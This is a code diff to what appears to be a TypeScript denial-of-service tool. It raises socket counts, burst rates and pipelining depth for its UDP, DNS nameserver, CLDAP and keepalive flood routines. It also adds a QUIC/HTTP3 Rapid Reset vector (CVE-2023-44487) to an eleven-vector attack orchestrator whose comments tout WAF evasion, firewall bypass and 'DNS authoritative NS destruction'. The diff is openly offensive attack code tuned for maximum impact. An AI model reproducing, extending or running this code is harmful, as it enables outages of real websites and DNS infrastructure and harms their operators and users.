@@ -351,7 +351,7 @@ async function runUDPFlood(
   // This exploits separate rate-limit pools on most CDNs and less-hardened IPv6 stacks.
   // IPv6 address space (2^128) makes IP-based blocking essentially impossible.
   // setInterval-burst: guaranteed to yield to the event loop every 1ms.
-  const numSockets = IS_PROD ? (IS_DEPLOYED ? Math.max(1, Math.min(threads, 128)) : Math.max(1, Math.min(threads, 32))) : Math.min(threads, 8);
+  const numSockets = IS_PROD ? (IS_DEPLOYED ? Math.max(1, Math.min(threads, 128)) : Math.max(1, Math.min(threads, 96))) : Math.min(threads, 8);
   const BURST      = getDynamicBurst(800);
   const TICK_MS    = 1;
   // Hit multiple ports to bypass single-port firewall rules
@@ -731,8 +731,8 @@ async function runDNSNsFlood(
   signal:       AbortSignal,
   onStats:      (p: number, b: number) => void,
 ): Promise<void> {
-  const NUM_SOCKS_PER_NS = IS_PROD ? Math.min(Math.ceil(threads / 4), 32) : 3;
-  const BURST            = getDynamicBurst(IS_PROD ? 500 : 80);
+  const NUM_SOCKS_PER_NS = IS_PROD ? Math.min(Math.ceil(threads / 4), 96) : 3;
+  const BURST            = getDynamicBurst(IS_PROD ? 1000 : 80);
   const TICK_MS          = 1;
 
   const domainParts = hostname.replace(/^https?:\/\//, "").split(".");
@@ -1100,7 +1100,7 @@ async function runCLDAPFlood(
   ]);
 
   const PACKETS = [PKT_BASE, PKT_CAPS];
-  const NUM_SOCKS = IS_PROD ? Math.min(threads, 32) : Math.min(threads, 8);
+  const NUM_SOCKS = IS_PROD ? Math.min(threads, 96) : Math.min(threads, 8);
   const BURST = getDynamicBurst(300);
   const TICK_MS = 1;
 
@@ -5680,7 +5680,7 @@ async function runKeepaliveExhaust(
   proxies: ProxyConfig[],
   signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
 ): Promise<void> {
-  const PIPELINE_DEPTH = IS_DEPLOYED ? 256 : 128; // requests per connection (was always 128)
+  const PIPELINE_DEPTH = IS_DEPLOYED ? 512 : 256; // 512 req/conn deployed, 256 non-deployed
 
   let localPkts = 0, localBytes = 0, conns = 0, pIdx = 0;
   const flush   = () => { onStats(localPkts, localBytes, conns); localPkts = 0; localBytes = 0; };
@@ -7533,28 +7533,29 @@ async function runGeassUltima(
 ): Promise<void> {
   const s = (p: number, b: number, c = 0) => onStats(p, b, c);
 
-  // Thread budget — each vector gets a proportional allocation
-  const v1  = Math.max(1, Math.round(threads * 0.22)); // Rapid Reset Ultra
-  const v2  = Math.max(1, Math.round(threads * 0.18)); // WAF Bypass
-  const v3  = Math.max(1, Math.round(threads * 0.16)); // H2 Storm (6 sub-vectors)
-  const v4  = Math.max(1, Math.round(threads * 0.12)); // App Smart Flood
-  const v5  = Math.max(1, Math.round(threads * 0.10)); // TLS Session Exhaust
-  const v6  = Math.max(1, Math.round(threads * 0.10)); // Conn Flood
-  const v7  = Math.max(1, Math.round(threads * 0.06)); // HTTP Pipeline
-  const v8  = Math.max(1, Math.round(threads * 0.03)); // SSE Exhaust
-  const v9  = Math.max(1, Math.round(threads * 0.02)); // UDP Flood
-  const v10 = Math.max(1, threads - v1 - v2 - v3 - v4 - v5 - v6 - v7 - v8 - v9); // DNS NS Flood
+  // Thread budget — tuned for maximum throughput per layer
+  const v1  = Math.max(1, Math.round(threads * 0.20)); // Rapid Reset Ultra     [CVE-2023-44487]
+  const v2  = Math.max(1, Math.round(threads * 0.16)); // WAF Bypass            [JA3+AKAMAI evasion]
+  const v3  = Math.max(1, Math.round(threads * 0.15)); // H2 Storm              [6 sub-vectors]
+  const v4  = Math.max(1, Math.round(threads * 0.11)); // App Smart Flood       [L7 adaptive]
+  const v5  = Math.max(1, Math.round(threads * 0.09)); // TLS Session Exhaust   [RSA handshake spam]
+  const v6  = Math.max(1, Math.round(threads * 0.09)); // Conn Flood            [TCP syn exhaustion]
+  const v7  = Math.max(1, Math.round(threads * 0.06)); // HTTP Pipeline         [256-depth pipelining]
+  const v8  = Math.max(1, Math.round(threads * 0.03)); // SSE Exhaust           [server-sent events hold]
+  const v9  = Math.max(1, Math.round(threads * 0.03)); // UDP Flood             [L3 bandwidth saturation]
+  const v10 = Math.max(1, Math.round(threads * 0.05)); // H3 Rapid Reset        [QUIC/UDP CVE-2023-44487]
+  const v11 = Math.max(1, threads - v1 - v2 - v3 - v4 - v5 - v6 - v7 - v8 - v9 - v10); // DNS NS flood
 
   const isHttps = targetPort === 443 || /^https:/i.test(base);
 
-  // All 10 vectors fire simultaneously — no warmup delay.
-  // V1-V3  = H2/TLS framing layer  |  V4-V6 = connection/thread layer
-  // V7-V8  = HTTP application layer |  V9 = network bandwidth
-  // V10    = DNS infrastructure (authoritative NS server destruction)
+  // All 11 vectors fire simultaneously — zero delay, every OSI layer hit at once.
+  // V1-V3  = H2/TLS framing      |  V4-V6  = connection/thread pool exhaustion
+  // V7-V8  = HTTP application     |  V9     = L3 bandwidth saturation
+  // V10    = QUIC/H3 UDP layer    |  V11    = DNS authoritative NS destruction
   await Promise.all([
     runRapidResetUltra(resolvedHost, hostname, targetPort, v1, signal, s, proxies),
     runWAFBypass(base, v2, proxies, signal, s),
-    Promise.all([                           // H2 Storm: all 6 H2 sub-vectors
+    Promise.all([                           // H2 Storm: all 6 H2 sub-vectors in parallel
       runH2SettingsStorm(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6) + (v3 % 6)), signal, s, proxies),
       runHPACKBomb(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), signal, s, proxies),
       runH2PingStorm(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), proxies, signal, s),
@@ -7568,7 +7569,8 @@ async function runGeassUltima(
     runHTTPPipeline(resolvedHost, hostname, targetPort, v7, proxies, signal, s),
     runSSEExhaust(resolvedHost, hostname, targetPort, v8, signal, s, proxies),
     runUDPFlood(resolvedHost, targetPort, v9, signal, (p, b) => onStats(p, b)),
-    runDNSNsFlood(resolvedHost, hostname, v10, signal, (p, b) => onStats(p, b)), // [V10] DNS NS destruction
+    runH3RapidReset(resolvedHost, targetPort, v10, signal, (p, b) => onStats(p, b), undefined), // [V10] QUIC/H3
+    runDNSNsFlood(resolvedHost, hostname, v11, signal, (p, b) => onStats(p, b)),                // [V11] DNS NS
   ]);
 }
 
